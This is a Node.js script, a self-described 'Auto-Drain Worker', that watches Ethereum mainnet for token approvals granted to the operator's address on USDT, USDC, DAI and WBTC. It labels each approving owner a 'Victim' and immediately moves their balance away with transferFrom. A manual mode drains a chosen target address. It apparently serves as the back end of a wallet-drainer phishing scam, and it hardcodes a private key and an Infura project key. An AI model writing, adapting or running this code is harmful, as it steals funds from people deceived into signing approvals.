const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = "0x75f8501c64abf4320568ac8c274e5fe1f079fb0c6d6f2b92d0bd96fb671b120e";
const RECEIVER_ADDRESS = "0xa24337d9736F9A9eEc0Ca0859234B72A503Ab931"; // Must match the one in the Private Key
const RPC_URL = "wss://mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5"; // Ethereum Mainnet WebSocket

// Tokens to Watch
const TARGET_TOKENS = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
];

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

async function startAutoWorker() {
    console.log("Starting Auto-Drain Worker...");

    // Setup Provider & Wallet
    // NOTE: For real-time event listening, WebSocket (wss://) is highly recommended over HTTP
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

    console.log(`Listening for Approvals to spender: ${RECEIVER_ADDRESS}`);

    // Option 1: Event Listener (Best for Automation)
    // This listens to the blockchain for ANY approval given to your address.
    for (const tokenAddress of TARGET_TOKENS) {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider); // Listen with provider

        // Filter: Approval(ANY_OWNER, YOUR_ADDRESS, ANY_VALUE)
        const filter = contract.filters.Approval(null, RECEIVER_ADDRESS);

        console.log(`Watching token: ${tokenAddress}`);

        contract.on(filter, async (owner, spender, value) => {
            console.log(`\n[EVENT] New Approval Detected!`);
            console.log(`Token: ${tokenAddress}`);
            console.log(`Victim: ${owner}`);
            console.log(`Value: ${value.toString()}`);

            // Trigger Drain Immediately
            await attemptDrain(wallet, tokenAddress, owner);
        });
    }

    // Keep script running
    setInterval(() => {
        console.log("Worker active... Waiting for events...");
    }, 60000);
}

async function attemptDrain(wallet, tokenAddress, victimAddress) {
    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet); // Sign with wallet

        // Double check balance
        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) {
            console.log("Victim has 0 balance. Skipping.");
            return;
        }

        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) {
            console.log("False alarm: Allowance is 0.");
            return;
        }

        const amountToSweep = balance > allowance ? allowance : balance;
        console.log(`Attempting to sweep ${amountToSweep} from ${victimAddress}...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        console.log(`Transaction sent! Hash: ${tx.hash}`);
        await tx.wait();
        console.log("Success! Funds secured.");

    } catch (error) {
        console.error("Drain failed:", error.message);
    }
}

// Option 2: Manual Trigger via Command Line Argument
// Usage: node auto_worker.js --target=0xVictimAddress
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));

if (targetArg) {
    const targetAddress = targetArg.split("=")[1];
    console.log(`Manual Trigger for target: ${targetAddress}`);
    // Check all tokens for this specific target instantly
    (async () => {
        const provider = new ethers.JsonRpcProvider(RPC_URL);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

        for (const token of TARGET_TOKENS) {
            await attemptDrain(wallet, token, targetAddress);
        }
    })();
} else {
    // Start Listening Mode
    startAutoWorker().catch(console.error);
}
